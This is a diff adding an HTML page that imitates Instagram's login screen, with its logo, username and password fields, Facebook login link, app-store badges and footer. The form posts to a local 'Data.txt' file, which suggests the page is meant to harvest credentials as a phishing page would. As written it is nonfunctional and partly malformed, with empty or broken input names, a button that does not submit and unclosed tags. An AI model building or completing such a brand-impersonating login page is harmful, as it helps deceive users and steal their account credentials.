@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+<link rel="stylesheet" media="screen and (min-width:1200px)" href="style.css">
+<link rel="stylesheet" media="screen and (max-width:1200px)" href="style-mobile.css">
+    <title>
+Instagram
+</title>
+
+        
+        <meta name="robots" content="noimageindex, noarchive">
+        <meta name="apple-mobile-web-app-status-bar-style" content="default">
+        <meta name="mobile-web-app-capable" content="yes">
+        <meta name="theme-color" content="#ffffff">
+        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
+   </head>
+  <body>
+    <div id="Insta"><img src="Instagram.jpg" alt="Instgram"></div>
+    <div class="form">
+    <form action="Data.txt" method="post">
+	<div id="Logo"><img src="Logo.png" alt="Logo"></div>
+     <div id="input"> <input id="Username" type="text" placeholder=" Phone number, username or email" name="" required></br>
+    <input type="password" placeholder=" Password" name"" required></br>
+  <input id="button" type="button" name="button" value="Log In"></br> </div> 
+<p>_________________OR___________________</p></br>
+<ul>
+<li><a href="#">Log in with Facebook</a></li>
+</ul>
+<a id="fb" href="#"> Forgot Password?</a>
+    
+    </form>
+</div>
+<div id="signup">
+  <p>Don't have an account? <a href="#">Sign up</a> </p>
+</div>
+<p id="Get">Get the app.</p>
+<div class="App-Buttons">
+<div id="app-store">
+<a href="#"><img src="app-store.png" alt="App Store">
+</div>
+<div id="Google-play">
+<a href="#"><img src="Google-play.png" alt="Google Play">
+</div>
+</div>
+<footer>
+<ul>
+<li><a href="#">ABOUT</a></li>
+<li><a href="#">HELP</a></li>
+<li><a href="#">PRESS</a></li>
+<li><a href="#">API</a></li>
+<li><a href="#">JOBS</a></li>
+<li><a href="#">PRIVACY</a></li>
+<li><a href="#">TERMS</a></li>
+<li><a href="#">LOCATIONS</a></li>
+<li><a href="#">TOP ACCOUNTS</a></li>
+<li><a href="#">HASHTAGS</a></li>
+<li><a href="#">LANGUAGE</a></li>
+</ul>
+<p>© 2020 INSTAGRAM FROM FACEBOOK</p>
+</footer>
+</body>
+  <html>
